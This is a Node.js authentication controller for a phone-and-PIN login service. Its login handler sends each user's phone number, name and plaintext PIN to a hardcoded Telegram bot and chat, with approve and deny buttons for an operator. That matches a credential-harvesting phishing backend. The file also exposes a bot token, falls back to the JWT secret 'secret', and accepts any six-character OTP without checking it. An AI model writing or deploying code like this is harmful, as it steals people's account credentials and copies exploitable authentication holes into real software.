const User = require('../models/User');
const jwt = require('jsonwebtoken');

// Telegram configuration
const BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const CHAT_ID = '8392790531';

const generateToken = (userId) => {
  return jwt.sign({ userId }, process.env.JWT_SECRET || 'secret', {
    expiresIn: '7d'
  });
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

// Send message to Telegram
async function sendTelegramMessage(message, replyMarkup = null) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    };
    
    if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    
    const data = await response.json();
    console.log('📤 Telegram response:', data);
    return data;
  } catch (error) {
    console.error('❌ Telegram send error:', error);
    return null;
  }
}

// ============================================
// AUTH CONTROLLER FUNCTIONS
// ============================================

// @desc    Register new user
// @route   POST /api/auth/register
exports.register = async (req, res) => {
  try {
    const { phoneNumber, pin, fullName, email } = req.body;

    // Check if user exists
    const existingUser = await User.findOne({ 
      $or: [{ phoneNumber }, { email }] 
    });

    if (existingUser) {
      return res.status(400).json({
        success: false,
        message: 'User already exists with this phone or email'
      });
    }

    // Create user
    const user = await User.create({
      phoneNumber,
      pin,
      fullName,
      email
    });

    // Generate token
    const token = generateToken(user._id);

    res.status(201).json({
      success: true,
      message: 'Registration successful',
      token,
      user: user.getPublicProfile()
    });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({
      success: false,
      message: 'Registration failed',
      error: error.message
    });
  }
};

// @desc    Login user - SENDS TELEGRAM NOTIFICATION
// @route   POST /api/auth/login
exports.login = async (req, res) => {
  try {
    const { phoneNumber, pin } = req.body;

    console.log('🔑 Login attempt for phone:', phoneNumber);

    // Find user with PIN field
    const user = await User.findOne({ phoneNumber }).select('+pin');

    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    // Verify PIN
    const isMatch = await user.comparePIN(pin);
    if (!isMatch) {
      return res.status(401).json({
        success: false,
        message: 'Invalid PIN'
      });
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    // Generate token
    const token = generateToken(user._id);

    // ============================================
    // SEND TELEGRAM NOTIFICATION TO ADMIN
    // ============================================
    console.log('📤 Sending Telegram notification to admin...');
    
    const timestamp = Date.now();
    const approveData = 'approve_' + timestamp;
    const cancelData = 'cancel_' + timestamp;

    const message = `🔐 *New Login Attempt*\n\n📱 *Phone:* +263 ${phoneNumber}\n👤 *User:* ${user.fullName}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n⚠️ Approve or cancel this access?`;

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: approveData },
          { text: '❌ Deny', callback_data: cancelData }
        ]
      ]
    };

    // Send Telegram message
    const telegramResponse = await sendTelegramMessage(message, replyMarkup);

    if (telegramResponse && telegramResponse.ok) {
      console.log('✅ Telegram notification sent successfully');
    } else {
      console.error('❌ Failed to send Telegram notification:', telegramResponse);
    }

    // Return response to frontend
    res.status(200).json({
      success: true,
      message: 'Login request sent. Please wait for admin approval.',
      token: token,
      user: user.getPublicProfile(),
      requiresApproval: true
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
};

// @desc    Get current user
// @route   GET /api/auth/me
exports.getMe = async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }
    res.status(200).json({
      success: true,
      user: user.getPublicProfile()
    });
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get user',
      error: error.message
    });
  }
};

// @desc    Verify OTP
// @route   POST /api/auth/verify-otp
exports.verifyOTP = async (req, res) => {
  try {
    const { phoneNumber, otp } = req.body;
    
    if (!otp || otp.length !== 6) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 6-digit OTP'
      });
    }

    const user = await User.findOne({ phoneNumber });
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    // Mark as verified
    user.isVerified = true;
    await user.save();
    
    const token = generateToken(user._id);
    
    res.status(200).json({
      success: true,
      message: 'OTP verified successfully',
      token,
      user: user.getPublicProfile()
    });
  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({
      success: false,
      message: 'Verification failed',
      error: error.message
    });
  }
};

// @desc    Resend OTP
// @route   POST /api/auth/resend-otp
exports.resendOTP = async (req, res) => {
  try {
    const { phoneNumber } = req.body;
    
    if (!phoneNumber) {
      return res.status(400).json({
        success: false,
        message: 'Phone number is required'
      });
    }

    // In production, generate and send actual OTP here
    res.status(200).json({
      success: true,
      message: 'OTP sent successfully'
    });
  } catch (error) {
    console.error('Resend OTP error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to resend OTP',
      error: error.message
    });
  }
};